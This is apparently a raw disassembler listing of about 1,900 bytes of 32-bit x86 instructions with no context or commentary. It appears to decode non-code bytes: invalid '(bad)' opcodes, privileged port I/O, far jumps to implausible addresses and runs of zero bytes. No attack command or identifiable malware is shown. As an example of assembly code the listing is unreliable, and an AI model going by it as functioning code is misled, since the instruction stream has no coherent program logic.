  402de8:	jecxz  0x402d78
  402dea:	addr16 sbb dh,dh
  402ded:	arpl   WORD PTR [esi+0xe7],bx
  402df3:	add    BYTE PTR [eax],al
  402df5:	jmp    0xf937:0xb4f1b87c
  402dfc:	and    cl,BYTE PTR [eax+esi*1+0x3a]
  402e00:	push   ebx
  402e01:	popa   
  402e02:	dec    ebx
  402e03:	jnp    0x402e49
  402e05:	push   edx
  402e06:	bound  ebx,QWORD PTR [esi+ebp*4-0x222aeaf5]
  402e0d:	or     BYTE PTR [esi+ebx*1],cl
  402e10:	nop
  402e11:	in     eax,dx
  402e12:	out    0x56,al
  402e14:	jg     0x402e0c
  402e16:	std    
  402e17:	mov    edi,0x1805e6b
  402e1c:	popf   
  402e1d:	jne    0x402e86
  402e1f:	xor    cl,cl
  402e21:	pop    eax
  402e22:	xchg   edx,eax
  402e23:	jae    0x402ddf
  402e25:	imul   ebx,DWORD PTR [ecx-0x235dd75c],0xffffffdd
  402e2c:	push   edi
  402e2d:	mov    eax,ds:0xb40616c3
  402e32:	scas   al,BYTE PTR es:[edi]
  402e33:	dec    edi
  402e34:	cmc    
  402e35:	pushf  
  402e36:	mov    ch,0x8b
  402e38:	and    cl,dh
  402e3a:	ins    DWORD PTR es:[edi],dx
  402e3b:	retf   0x13ef
  402e3e:	ja     0x402e49
  402e40:	ds daa 
  402e42:	pushf  
  402e43:	dec    eax
  402e44:	dec    ebp
  402e45:	or     al,0x85
  402e47:	(bad)  
  402e48:	jecxz  0x402e17
  402e4a:	rol    esi,1
  402e4c:	mov    ah,0xc6
  402e4e:	fiadd  DWORD PTR [eax]
  402e50:	or     eax,0x44c3a4f4
  402e55:	out    0xbd,eax
  402e57:	ficom  DWORD PTR [ebx+0x0]
  402e5a:	add    BYTE PTR [eax],al
  402e5c:	add    BYTE PTR [eax],al
  402e5e:	jecxz  0x402e85
  402e60:	pop    ebp
  402e61:	xchg   edx,eax
  402e62:	sbb    BYTE PTR [esp+eax*2],bh
  402e65:	shl    edx,0x57
  402e68:	outs   dx,DWORD PTR ds:[esi]
  402e69:	add    BYTE PTR [edx+0x3c577652],bh
  402e6f:	adc    DWORD PTR [ecx],edi
  402e71:	mov    ds,WORD PTR [edi+0x18]
  402e74:	and    ch,al
  402e76:	(bad)  
  402e77:	cld    
  402e78:	or     bh,ah
  402e7a:	outs   dx,BYTE PTR ds:[esi]
  402e7b:	out    0x11,al
  402e7d:	pop    edx
  402e7e:	imul   edi,DWORD PTR [edi+ebx*8],0xffffff9b
  402e82:	jo     0x402eaa
  402e84:	(bad)  
  402e85:	fcomp  DWORD PTR [edx-0x3de612ae]
  402e8b:	push   edi
  402e8c:	hlt    
  402e8d:	ds inc esp
  402e8f:	sbb    BYTE PTR [ebx-0x5deec889],bh
  402e95:	mov    esp,0xf588e6c7
  402e9a:	push   ss
  402e9b:	sti    
  402e9c:	(bad)  
  402e9d:	and    ch,ch
  402e9f:	bound  edx,QWORD PTR [edi]
  402ea1:	arpl   WORD PTR [edx-0x2f6ff182],bp
  402ea7:	cwde   
  402ea8:	and    eax,0x3c9049d1
  402ead:	push   es
  402eae:	scas   al,BYTE PTR es:[edi]
  402eaf:	iret   
  402eb0:	jae    0x402ef1
  402eb2:	push   ecx
  402eb3:	fisubr DWORD PTR [edx+0x74]
  402eb6:	sbb    eax,0x5cad41be
  402ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebc:	pop    eax
  402ebd:	in     al,dx
  402ebe:	inc    ecx
  402ebf:	dec    ecx
  402ec0:	lock and eax,0x0
  402ec6:	add    BYTE PTR [ebx],bh
  402ec8:	pusha  
  402ec9:	jmp    0xc273b23c
  402ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ecf:	fisubr DWORD PTR [esi]
  402ed1:	fild   DWORD PTR [eax]
  402ed3:	int    0x48
  402ed5:	adc    eax,0xe799c94
  402eda:	lea    ebx,[edi-0x59]
  402edd:	and    esp,DWORD PTR [esi-0x40c767f2]
  402ee3:	rol    DWORD PTR [ebx-0x4d9fc760],0xbb
  402eea:	and    DWORD PTR [ebx],edx
  402eec:	xchg   si,ax
  402eee:	or     al,BYTE PTR [edx]
  402ef0:	push   ebp
  402ef1:	lea    edx,[ebx]
  402ef3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ef4:	dec    bl
  402ef6:	pop    esp
  402ef7:	inc    esp
  402ef8:	out    dx,eax
  402ef9:	(bad)  
  402efa:	inc    ebp
  402efb:	pop    ss
  402efc:	popa   
  402efd:	cli    
  402efe:	outs   dx,BYTE PTR ds:[esi]
  402eff:	(bad)  
  402f00:	adc    ecx,esp
  402f02:	ja     0x402ebc
  402f04:	sbb    edi,DWORD PTR [ebx-0x5fa59646]
  402f0a:	mov    ds:0x888d06aa,eax
  402f0f:	jmp    0x402ec8
  402f11:	xchg   ebp,eax
  402f12:	xchg   ecx,eax
  402f13:	cld    
  402f14:	sub    eax,0x9d2dded7
  402f19:	int3   
  402f1a:	(bad)  
  402f1b:	outs   dx,BYTE PTR ds:[esi]
  402f1c:	retf   
  402f1d:	loope  0x402f0b
  402f1f:	lahf   
  402f20:	jp     0x402f1c
  402f22:	cmc    
  402f23:	xor    BYTE PTR [edi+0x62],ch
  402f26:	jb     0x402f59
  402f28:	loopne 0x402fa3
  402f2a:	imul   eax,DWORD PTR [eax],0x0
  402f2d:	add    BYTE PTR [eax],al
  402f2f:	add    BYTE PTR [edx-0x70],ah
  402f32:	push   esp
  402f33:	inc    eax
  402f34:	xchg   ebx,eax
  402f35:	inc    ecx
  402f36:	dec    edi
  402f37:	pop    ecx
  402f38:	aam    0xb3
  402f3a:	or     eax,0x14e31516
  402f3f:	pcmpgtd mm2,QWORD PTR [ebp+0x38]
  402f43:	and    al,0xa7
  402f45:	inc    esp
  402f46:	and    edi,DWORD PTR ds:0x65fcf1eb
  402f4c:	mov    edx,0x757ce660
  402f51:	push   cs
  402f52:	or     eax,0xfc474acb
  402f57:	iret   
  402f58:	sub    ecx,DWORD PTR [edx+esi*2-0x5c328b6f]
  402f5f:	mov    ch,BYTE PTR [ebp+0xa]
  402f62:	shl    BYTE PTR [edi-0x433eb47a],1
  402f68:	(bad)  
  402f69:	pop    eax
  402f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f6b:	and    al,0xe0
  402f6d:	xchg   ecx,eax
  402f6e:	aam    0x3f
  402f70:	loope  0x402f38
  402f72:	xchg   BYTE PTR [edx],dl
  402f74:	add    al,al
  402f76:	jne    0x402f81
  402f78:	repz push esp
  402f7a:	call   0x19d5ebc6
  402f7f:	push   ebx
  402f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f81:	ret    0x7e49
  402f84:	jle    0x402f89
  402f86:	cmp    esp,DWORD PTR [ebp-0x69]
  402f89:	popa   
  402f8a:	cmp    eax,0x4c98a23f
  402f8f:	and    al,0xa3
  402f91:	fistp  WORD PTR [esi]
  402f93:	or     DWORD PTR [eax],eax
  402f95:	add    BYTE PTR [eax],al
  402f97:	add    BYTE PTR [eax],al
  402f99:	adc    BYTE PTR [esi],0xee
  402f9c:	adc    DWORD PTR [ecx-0x3],esi
  402f9f:	jg     0x402ff4
  402fa1:	mov    esi,0xa748913c
  402fa6:	jnp    0x402f89
  402fa8:	gs mov esp,0xd57eb2ba
  402fae:	jmp    0x605b1669
  402fb3:	(bad)  
  402fb4:	std    
  402fb5:	sub    edx,DWORD PTR [edi-0x31b72f6c]
  402fbb:	arpl   bx,cx
  402fbd:	sub    DWORD PTR ds:0x43f689fa,eax
  402fc3:	or     edx,DWORD PTR [ecx-0x43a8cd11]
  402fc9:	les    esi,FWORD PTR [ecx+0x28]
  402fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fcd:	int    0x1
  402fcf:	xor    bl,BYTE PTR [esi+esi*8+0xd6cf2fc]
  402fd6:	in     al,0x9f
  402fd8:	mov    ebp,0xce610b28
  402fdd:	or     edx,DWORD PTR [edx]
  402fdf:	ss popa 
  402fe1:	loop   0x403043
  402fe3:	out    dx,eax
  402fe4:	das    
  402fe5:	rol    DWORD PTR [edi-0x5c],0x2
  402fe9:	pushf  
  402fea:	cs pop ebp
  402fec:	adc    DWORD PTR [edi+0x4f162a35],esi
  402ff2:	mov    ch,0xeb
  402ff4:	out    0x35,al
  402ff6:	lods   al,BYTE PTR ds:[esi]
  402ff7:	test   al,0x33
  402ff9:	adc    ebx,eax
  402ffb:	imul   eax,DWORD PTR [eax+eax*1+0x0],0x22000000
  403003:	fisubr DWORD PTR [esi]
  403005:	fisttp DWORD PTR [ebx-0x67]
  403008:	out    0xa9,eax
  40300a:	pop    eax
  40300b:	nop
  40300c:	lods   al,BYTE PTR ds:[esi]
  40300d:	js     0x403084
  40300f:	xchg   DWORD PTR gs:[bp+0x7e],ebx
  403014:	add    ecx,DWORD PTR [esi+0x7ec231b4]
  40301a:	iret   
  40301b:	sub    dh,BYTE PTR [ecx-0x55]
  40301e:	jmp    0xe75c:0xc9dc3043
  403025:	push   edx
  403026:	mov    al,ds:0x83419e15
  40302b:	push   cs
  40302c:	push   ebp
  40302d:	lock pop edi
  40302f:	out    0xb,eax
  403031:	pop    ds
  403032:	jne    0x403034
  403034:	sti    
  403035:	add    ecx,DWORD PTR ds:0xf7f4ba7a
  40303b:	bound  edi,QWORD PTR [ecx+0x25]
  40303e:	ror    DWORD PTR [ebx-0x6b1fa9c8],cl
  403044:	(bad)  
  403046:	or     esi,ebx
  403048:	xchg   esi,eax
  403049:	mov    bh,0x1a
  40304b:	mov    DWORD PTR [eax],0xefc48f5d
  403051:	adc    al,0xdc
  403053:	fdecstp 
  403055:	shl    ch,1
  403057:	pop    es
  403058:	scas   al,BYTE PTR es:[edi]
  403059:	xchg   ecx,eax
  40305a:	cli    
  40305b:	push   ds
  40305c:	mov    bh,0x42
  40305e:	xlat   BYTE PTR ds:[ebx]
  40305f:	icebp  
  403060:	fwait
  403061:	add    esp,DWORD PTR [ebp*8+0xd484]
  403068:	add    BYTE PTR [eax],al
  40306a:	add    BYTE PTR [esi+0x398dca2b],cl
  403070:	xor    dl,bl
  403072:	inc    esi
  403073:	pusha  
  403074:	pop    ebp
  403075:	clc    
  403076:	dec    eax
  403078:	inc    ebp
  403079:	loope  0x403003
  40307b:	scas   eax,DWORD PTR es:[edi]
  40307c:	frstor [esi+0x49]
  40307f:	jl     0x403046
  403081:	jg     0x40308d
  403083:	cmp    eax,0x53cb54aa
  403088:	mov    bl,0x4d
  40308a:	mov    eax,cs
  40308c:	je     0x403090
  40308e:	inc    ebp
  40308f:	mov    bl,0x69
  403091:	sbb    ecx,DWORD PTR [esi]
  403093:	out    0x86,al
  403095:	xor    bh,al
  403097:	push   ss
  403098:	lahf   
  403099:	sub    DWORD PTR [ecx+0x60e4c5e7],esp
  40309f:	adc    al,0xe0
  4030a1:	std    
  4030a2:	adc    eax,DWORD PTR [ebp-0x4d]
  4030a5:	(bad)  
  4030a6:	rcr    BYTE PTR [ebx],cl
  4030a8:	stos   BYTE PTR es:[edi],al
  4030a9:	iret   
  4030aa:	test   DWORD PTR [eax-0x54c37f97],esp
  4030b0:	je     0x40304b
  4030b2:	imul   DWORD PTR [edi-0x61]
  4030b5:	mov    dl,0xae
  4030b7:	sub    DWORD PTR ds:[ebx+0x2c1b1d59],0x18
  4030bf:	add    BYTE PTR [edi],0x35
  4030c2:	fld    TBYTE PTR [esp+ebp*8-0xea265e3]
  4030c9:	push   es
  4030ca:	add    BYTE PTR [eax+0x63],dl
  4030cd:	jo     0x403117
  4030cf:	add    BYTE PTR [eax],al
  4030d1:	add    BYTE PTR [eax],al
  4030d3:	add    BYTE PTR [ecx],al
  4030d5:	shr    DWORD PTR [ebx+0x51],cl
  4030d8:	ret    0x4685
  4030db:	jp     0x403060
  4030dd:	xor    eax,0xd9aa635d
  4030e2:	cli    
  4030e3:	retf   
  4030e4:	fld    TBYTE PTR [eax-0x1f]
  4030e7:	rcr    BYTE PTR [eax],cl
  4030e9:	cmp    ah,cl
  4030eb:	stc    
  4030ec:	cmp    DWORD PTR [edi+0x1886e0d7],eax
  4030f2:	xchg   esi,eax
  4030f3:	scas   eax,DWORD PTR es:[edi]
  4030f4:	(bad)  
  4030f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f6:	mov    WORD PTR [esi-0x62600cec],?
  4030fc:	push   ebp
  4030fd:	inc    esp
  4030fe:	mov    ebx,0x235f6284
  403103:	add    edx,DWORD PTR [ebx-0x2fe5c812]
  403109:	add    DWORD PTR ds:0xe111131,edx
  40310f:	sub    BYTE PTR [esi-0x62],bl
  403112:	dec    edi
  403113:	addr16 lahf 
  403115:	sub    edx,DWORD PTR [esi+edi*2-0x34]
  403119:	jl     0x403194
  40311b:	push   ebp
  40311c:	or     eax,0x7b4c62ce
  403121:	lds    edi,FWORD PTR [eax]
  403123:	sub    DWORD PTR [edx],0xe9982376
  403129:	sub    cl,BYTE PTR [esi]
  40312b:	mov    bl,0x88
  40312d:	fwait
  40312e:	adc    eax,0x540257aa
  403133:	in     eax,0x16
  403135:	mov    cl,0x4e
  403137:	cld    
  403138:	add    BYTE PTR [eax],al
  40313a:	add    BYTE PTR [eax],al
  40313c:	add    BYTE PTR [ebp+0x64d761e7],ah
  403142:	push   esi
  403143:	jns    0x403113
  403145:	xor    edx,DWORD PTR [ebx-0x1f]
  403148:	dec    ecx
  403149:	loop   0x40318e
  40314b:	cli    
  40314c:	push   eax
  40314d:	jne    0x40318d
  40314f:	out    dx,al
  403150:	(bad)  
  403151:	sahf   
  403152:	neg    DWORD PTR [esi]
  403154:	int3   
  403155:	xchg   edi,eax
  403156:	fmul   DWORD PTR [ebp+0x7c99588d]
  40315c:	xchg   esi,eax
  40315d:	dec    ecx
  40315e:	pop    edx
  40315f:	stos   DWORD PTR es:[edi],eax
  403160:	mov    ebx,0xa0da1b5a
  403165:	jnp    0x40313e
  403167:	mov    bl,0x7e
  403169:	dec    ebx
  40316a:	mov    es,edx
  40316c:	cmp    al,BYTE PTR gs:[ebp-0x6b]
  403170:	dec    eax
  403171:	dec    ecx
  403172:	mov    esp,0xd3485363
  403177:	not    BYTE PTR [ecx]
  403179:	(bad)  
  40317a:	xchg   edx,eax
  40317b:	pop    es
  40317c:	or     DWORD PTR [esi+0x6d245841],edx
  403182:	add    BYTE PTR [ecx],ch
  403184:	aas    
  403185:	test   BYTE PTR [edi+0x4703a73d],cl
  40318b:	dec    esp
  40318c:	mov    esp,0x911b0df2
  403191:	rol    esp,1
  403193:	jmp    0x80cc0221
  403198:	retf   
  403199:	xchg   DWORD PTR [edx-0x6f],ecx
  40319c:	ror    BYTE PTR [esi+0xfdde09],1
  4031a2:	add    BYTE PTR [eax],al
  4031a4:	add    BYTE PTR [eax],al
  4031a6:	mov    ch,0xc8
  4031a8:	scas   al,BYTE PTR es:[edi]
  4031a9:	out    0x4c,al
  4031ab:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4031ad:	mov    esp,0xa7d45f81
  4031b2:	jo     0x4031c8
  4031b4:	or     DWORD PTR [edx-0x6e8e326d],0xffffff92
  4031bb:	sub    al,0xcf
  4031be:	lds    eax,FWORD PTR [ebx+0x19]
  4031c1:	retf   
  4031c2:	int3   
  4031c3:	mov    al,0x45
  4031c5:	out    0xb7,al
  4031c7:	jno    0x4031ff
  4031c9:	std    
  4031ca:	into   
  4031cb:	add    bl,BYTE PTR [ebx+ebp*1-0x70]
  4031cf:	ficom  WORD PTR ds:0xdec7a35a
  4031d5:	or     al,0xc6
  4031d7:	lods   al,BYTE PTR ds:[esi]
  4031d8:	xchg   edi,eax
  4031d9:	sti    
  4031da:	mov    edx,0x7c6e38b5
  4031df:	jp     0x4031da
  4031e1:	sahf   
  4031e2:	arpl   WORD PTR [bp+si+0x3acf],di
  4031e7:	mov    BYTE PTR [ebx-0x40],bh
  4031ea:	cdq    
  4031eb:	xchg   ecx,eax
  4031ec:	jmp    0x1642a6f4
  4031f1:	sub    dh,BYTE PTR [edi-0xe27b8fe]
  4031f7:	add    BYTE PTR [eax],dh
  4031f9:	jle    0x403236
  4031fb:	add    BYTE PTR [ebp-0x2dfa8395],ah
  403201:	shr    DWORD PTR [esi-0x17c084fd],0x5
  403208:	fs adc eax,0x0
  40320e:	add    BYTE PTR [edx+0x7],al
  403211:	popa   
  403212:	push   esp
  403213:	xchg   BYTE PTR [esi+ebp*2],cl
  403216:	cli    
  403217:	lds    ecx,FWORD PTR [edi+edi*4]
  40321a:	mov    BYTE PTR [edx],al
  40321c:	js     0xd4e5ad0
  403222:	mov    ebp,0x931a0b6f
  403227:	popf   
  403228:	or     ebx,esp
  40322a:	lock fadd DWORD PTR [edi]
  40322d:	lods   al,BYTE PTR ds:[esi]
  40322e:	inc    esi
  40322f:	rol    DWORD PTR [edi],1
  403231:	fldenv [edx-0x6d]
  403234:	push   ds
  403235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403236:	int3   
  403237:	pop    ecx
  403238:	push   ds
  403239:	div    DWORD PTR [esi]
  40323b:	pop    ss
  40323c:	sbb    al,0x0
  40323e:	and    ebp,edx
  403240:	sbb    al,0x95
  403242:	or     bl,BYTE PTR [edx+0x50246217]
  403248:	sbb    DWORD PTR [eax],eax
  40324a:	sub    ebx,DWORD PTR [ebx]
  40324c:	push   0x29ad3418
  403251:	sbb    DWORD PTR [ecx],esi
  403253:	in     al,0xf5
  403255:	adc    DWORD PTR [esi],ebx
  403257:	(bad)  
  403258:	mov    bl,0x13
  40325a:	dec    edi
  40325b:	adc    BYTE PTR [ebx+0x11],dh
  40325e:	js     0x403222
  403260:	das    
  403261:	adc    ch,bl
  403263:	lods   al,BYTE PTR ds:[esi]
  403264:	(bad)  
  403265:	adc    al,0xca
  403267:	push   es
  403268:	mov    esi,0x7ae87314
  40326d:	push   ss
  40326e:	pushf  
  40326f:	sbb    bh,BYTE PTR [ecx]
  403271:	pop    ss
  403272:	leave  
  403273:	add    BYTE PTR [eax],al
  403275:	add    BYTE PTR [eax],al
  403277:	add    BYTE PTR [ebx],dh
  403279:	dec    ebp
  40327a:	cmp    BYTE PTR [esi+0x67398ce5],dh
  403280:	pop    es
  403281:	retf   0x903b
  403284:	adc    DWORD PTR [eax],ecx
  403286:	cmp    al,BYTE PTR ds:0xf23f471b
  40328c:	cli    
  40328d:	test   BYTE PTR [esi],bh
  40328f:	sbb    edi,DWORD PTR [edi+0x49443c7b]
  403295:	add    BYTE PTR ds:0x365c8041,bh
  40329b:	push   cs
  40329c:	bound  ebx,QWORD PTR [esi-0x274a20c9]
  4032a2:	xor    eax,0x341a1fe8
  4032a7:	ins    DWORD PTR es:[edi],dx
  4032a8:	or     BYTE PTR [ebx+0x31],dl
  4032ab:	cmp    ch,BYTE PTR [edx+0x4c833095]
  4032b1:	iret   
  4032b2:	xor    cl,BYTE PTR [esi+esi*2+0x12793311]
  4032b9:	daa    
  4032ba:	and    al,0x86
  4032bc:	lock push 0xac665725
  4032c2:	daa    
  4032c3:	and    BYTE PTR [ebp+ebp*8+0x4c000025],ch
  4032ca:	bound  esp,QWORD PTR [ebx]
  4032cc:	aaa    
  4032cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ce:	lahf   
  4032cf:	and    ch,BYTE PTR [esi-0x69]
  4032d2:	out    0x20,al
  4032d4:	dec    ecx
  4032d5:	jb     0x4032fb
  4032d7:	and    DWORD PTR [ebx+esi*1+0x78],eax
  4032db:	sub    al,BYTE PTR [eax]
  4032dd:	add    BYTE PTR [eax],al
  4032df:	add    BYTE PTR [eax],al
  4032e1:	and    ebx,ebp
  4032e3:	mov    edx,0xfbdeca2b
  4032e8:	sub    ebp,ebp
  4032ea:	or     BYTE PTR [esi],bh
  4032ec:	sub    BYTE PTR [eax],cl
  4032ee:	sbb    esi,DWORD PTR [ecx+0x2d]
  4032f1:	dec    edi
  4032f2:	hlt    
  4032f3:	mov    dl,0x2c
  4032f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032f6:	into   
  4032f7:	cmc    
  4032f8:	cs mov cl,0x20
  4032fb:	aaa    
  4032fc:	das    
  4032fd:	sbb    al,0x8c
  4032ff:	call   0xf271:0x5865cb70
  403306:	push   edi
  403307:	push   ds
  403308:	jae    0x40334f
  40330a:	mov    dl,0xdb
  40330c:	jb     0x4032de
  40330e:	mov    ds:0x4d677792,eax
  403313:	push   ecx
  403314:	jbe    0x403394
  403316:	outs   dx,DWORD PTR ds:[esi]
  403317:	pop    ss
  403318:	je     0x403373
  40331a:	cdq    
  40331b:	aad    0x75
  40331d:	push   esp
  40331e:	mov    ds:0x34537e89,al
  403323:	dec    ebx
  403324:	jg     0x4032c0
  403326:	push   es
  403327:	or     eax,0xcee0bd7d
  40332c:	jl     0x403366
  40332e:	repz jg 0x4033aa
  403331:	pop    ds
  403332:	sbb    eax,0x1ed67842
  403337:	add    al,0x7a
  403339:	loope  0x403306
  40333b:	(bad)  
  40333c:	jnp    0x40334a
  40333e:	test   al,0xbb
  403340:	ins    BYTE PTR es:[edi],dx
  403341:	fild   DWORD PTR [ecx+0x7e]
  403344:	ins    DWORD PTR es:[edi],dx
  403345:	add    BYTE PTR [eax],al
  403347:	add    BYTE PTR [eax],al
  403349:	add    BYTE PTR [ebp-0xf],dh
  40334c:	mov    eax,0x9342e238
  403351:	cli    
  403352:	fcmovne st,st(7)
  403354:	test   DWORD PTR [ebp+0x77af64ce],esi
  40335a:	iret   
  40335b:	lods   eax,DWORD PTR ds:[esi]
  40335c:	push   ecx
  40335d:	xor    DWORD PTR [ebp-0x630d0452],ebx
  403363:	mov    bl,0x3c
  403365:	scas   eax,DWORD PTR es:[edi]
  403366:	xchg   edi,eax
  403367:	fcom   DWORD PTR [esi]
  403369:	ins    DWORD PTR es:[edi],dx
  40336a:	xchg   esi,eax
  40336b:	mov    DWORD PTR [eax+0x2b],ebp
  40336e:	xchg   esp,eax
  40336f:	jp     0x403333
  403371:	jmp    0xa7144b0b
  403376:	cwde   
  403377:	or     al,0x7e
  403379:	fs xchg ecx,eax
  40337b:	cmc    
  40337c:	jmp    DWORD PTR [ecx]
  40337e:	pop    ebx
  40337f:	push   esi
  403380:	sub    ah,al
  403382:	push   edx
  403383:	or     ecx,edi
  403385:	xlat   BYTE PTR ds:[ebx]
  403386:	sub    eax,0x2c1564b0
  40338b:	loope  0x4033a7
  40338d:	push   ebx
  40338e:	ds push edx
  403390:	xor    DWORD PTR [ecx-0x21d840c1],edx
  403396:	xor    dh,BYTE PTR [ebp+ecx*1+0x1c]
  40339a:	sub    ebx,DWORD PTR [ebp+0x73]
  40339d:	pop    edx
  40339e:	inc    ecx
  40339f:	jle    0x40337a
  4033a1:	cwde   
  4033a2:	cmp    BYTE PTR [ebx+0x483bc49e],al
  4033a8:	mov    ah,0x6
  4033aa:	xor    bl,BYTE PTR [ecx+0x404a]
  4033b0:	add    BYTE PTR [eax],al
  4033b2:	add    BYTE PTR [eax],bh
  4033b4:	push   0xffffffe0
  4033b6:	xor    DWORD PTR [ecx],0x34ccf5e7
  4033bc:	mov    esp,0xc5350f5b
  4033c1:	mov    eax,ds:0x87c6b749
  4033c6:	mov    esi,DWORD PTR [esi+0x642bb902]
  4033cc:	dec    esi
  4033cd:	mov    BYTE PTR ds:0x78174fa6,0xc8
  4033d4:	push   ecx
  4033d5:	loopne 0x4033a8
  4033d7:	add    dl,BYTE PTR [eax+0x75]
  4033da:	les    edi,FWORD PTR ds:0x7f6e8255
  4033e0:	push   esp
  4033e1:	dec    ebx
  4033e2:	adc    BYTE PTR [ecx-0x14c5ebae],dh
  4033e8:	push   edx
  4033e9:	adc    ebp,edi
  4033eb:	adc    al,0x5c
  4033ed:	ds push edi
  4033ef:	push   ebp
  4033f0:	pop    ebp
  4033f1:	outs   dx,DWORD PTR ds:[esi]
  4033f2:	test   eax,0x83585b9b
  4033f7:	rcr    DWORD PTR [ecx-0x43],1
  4033fa:	xchg   esp,eax
  4033fb:	push   cs
  4033fc:	push   edi
  4033fd:	jmp    0x6240:0x93564cbe
  403404:	pop    eax
  403405:	jl     0x4033f1
  403407:	sbb    DWORD PTR [ecx+0x69],ebx
  40340a:	push   ds
  40340b:	test   al,0xa3
  40340d:	xchg   esi,eax
  40340e:	xor    al,0xe2
  403410:	mov    eax,ds:0xa404cac7
  403415:	mov    al,0x60
  403417:	add    BYTE PTR [eax],al
  403419:	add    BYTE PTR [eax],al
  40341b:	add    BYTE PTR [esi-0x5b],al
  40341e:	and    eax,0x52a08177
  403423:	fnstsw WORD PTR [ebx-0x12dd0460]
  403429:	sahf   
  40342a:	in     al,0x8
  40342c:	das    
  40342d:	sahf   
  40342e:	loope  0x40347d
  403430:	pop    ebx
  403431:	test   eax,0xa796e3ee
  403436:	aas    
  403437:	call   0xa715:0xb008a5d7
  40343e:	lea    esp,[ebp-0x746555ae]
  403444:	mov    BYTE PTR [edx+0x6d646300],ch
  40344a:	jmp    0x403478
  40344c:	ret    0xea29
  40344f:	pop    ecx
  403450:	ficom  WORD PTR [ebx]
  403452:	std    
  403453:	es inc eax
  403455:	sar    ah,cl
  403457:	ja     0x4033f3
  403459:	(bad)  
  40345a:	inc    BYTE PTR [eax+0x15ff4d74]
  403460:	imul   ebx,DWORD PTR [edx+edi*8],0xfbda78e2
  403467:	stos   DWORD PTR es:[edi],eax
  403468:	repnz cwde 
  40346a:	stc    
  40346b:	mov    ah,0x9c
  40346d:	push   esi
  40346e:	clc    
  40346f:	mov    cl,0xd1
  403471:	add    dh,bl
  403473:	sahf   
  403474:	repz (bad) 
  403476:	repnz iret 
  403478:	or     eax,0xa7f8f084
  40347d:	inc    eax
  40347e:	icebp  
  40347f:	pop    ebp
  403480:	add    BYTE PTR [eax],al
  403482:	add    BYTE PTR [eax],al
  403484:	add    BYTE PTR [ecx+0xb4af409],bh
  40348a:	int    0xf5
  40348c:	repz add al,BYTE PTR [esi+0x482f1cf7]
  403493:	test   BYTE PTR [ecx+0x4a],0x3a
  403497:	fnstenv [esi]
  403499:	in     al,0x79
  40349b:	fsub   st,st(7)
  40349d:	push   DWORD PTR [esi-0x6efef26]
  4034a3:	fiadd  DWORD PTR [ebp+0x72de3212]
  4034a9:	fdiv   QWORD PTR [ebx-0x21]
  4034ac:	fwait
  4034ad:	xchg   esi,eax
  4034ae:	scas   al,BYTE PTR es:[edi]
  4034af:	ffree  st(4)
  4034b1:	cmp    bh,ch
  4034b3:	fcmovnb st,st(1)
  4034b5:	ins    DWORD PTR es:[edi],dx
  4034b6:	sub    edx,edi
  4034b8:	mov    ss,WORD PTR [edi+0x69]
  4034bb:	(bad)  
  4034bc:	pop    edi
  4034bd:	mov    cl,0xa7
  4034bf:	aam    0x68
  4034c1:	add    esp,ebp
  4034c3:	aam    0x0
  4034c5:	nop
  4034c6:	push   edi
  4034c7:	(bad)  
  4034c8:	sar    BYTE PTR [edi+0x76d1a0c9],1
  4034ce:	out    dx,al
  4034cf:	in     eax,0xd3
  4034d1:	jns    0x4034eb
  4034d3:	and    al,0xd2
  4034d5:	pop    esp
  4034d6:	jns    0x403536
  4034d8:	lds    esi,FWORD PTR [ebx-0x6e]
  4034db:	pushf  
  4034dc:	les    ebp,FWORD PTR [edx]
  4034de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034df:	fld    st(6)
  4034e1:	adc    eax,0x88c71843
  4034e6:	push   esp
  4034e7:	push   edi
  4034e8:	ret    0x0
  4034eb:	add    BYTE PTR [eax],al
  4034ed:	add    BYTE PTR [edi-0x13c6b46],dh
  4034f3:	jg     0x4034c8
  4034f5:	rol    ecx,0x66
  4034f8:	adc    eax,eax
  4034fa:	les    ebp,FWORD PTR [ecx]
  4034fc:	dec    ebp
  4034fd:	retf   
  4034fe:	fwait
  4034ff:	ja     0x403490
  403501:	retf   0xf562
  403504:	enter  0x6dc8,0x13
  403508:	or     ecx,ecx
  40350a:	add    BYTE PTR [edx],0x44
  40350d:	int3   
  40350e:	iret   
  40350f:	fild   WORD PTR [ebp-0x3f323933]
  403515:	iret   
  403516:	sub    DWORD PTR [edx+eax*1],edi
  403519:	into   
  40351a:	mov    WORD PTR [edi+ebp*4+0x6d7a4391],ss
  403521:	nop
  403522:	jp     0x403564
  403524:	sub    edx,DWORD PTR [edx-0x6c17553b]
  40352a:	pop    eax
  40352b:	mov    ecx,0x46e796a5
  403530:	fs xchg edi,eax
  403532:	out    dx,al
  403533:	and    dl,BYTE PTR fs:[ebp-0x6b1f7d2f]
  40353a:	aam    0xc1
  40353c:	mov    esp,0x7e1fcb9f
  403541:	sahf   
  403542:	jne    0x40357b
  403544:	adc    al,0x38
  403546:	jmp    0xe13a6f94
  40354b:	les    ebp,FWORD PTR [eax]
  40354d:	mov    ch,0xdd
  40354f:	(bad)  
  403551:	jbe    0x403553
  403553:	add    BYTE PTR [eax],al
  403555:	add    BYTE PTR [eax],al
  403557:	or     al,0xe2
  403559:	jl     0x40358c
  40355b:	push   cs
  40355c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40355d:	shl    bl,cl
  40355f:	call   FWORD PTR [ebx]
  403561:	out    dx,eax
  403562:	mov    al,ch
  403564:	pushf  
  403565:	pop    eax
  403566:	dec    ebx
  403567:	add    DWORD PTR [esi-0x5e],ebp
  40356a:	or     eax,0xcf8cc2fb
  40356f:	repnz dec edi
  403571:	xchg   esi,eax
  403572:	sub    bh,0xe0
  403575:	scas   eax,DWORD PTR es:[edi]
  403576:	inc    edx
  403577:	(bad)  
  403578:	sub    DWORD PTR [edx+0x4],ecx
  40357b:	cld    
  40357c:	cs in  al,0xc5
  40357f:	in     eax,dx
